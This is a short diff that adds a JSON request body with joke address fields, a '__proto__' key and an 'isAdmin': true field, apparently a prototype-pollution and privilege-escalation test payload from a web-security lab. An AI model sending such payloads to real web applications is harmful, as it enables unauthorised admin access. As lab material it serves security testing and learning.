@@ -1,0 +1,10 @@
+{
+  "address_line_1": "Wiener HQ",
+  "address_line_2": "One Wiener Way",
+  "city": "Wienerville",
+  "postcode": "BU1 1RP",
+  "country": "IL",
+  "__proto__" : {"fpp" : "barr"},
+	"isAdmin" : true,
+  "sessionId": "1zTd1wsqP411tCGCBMWKhZDAoOmG1dgH"
+}
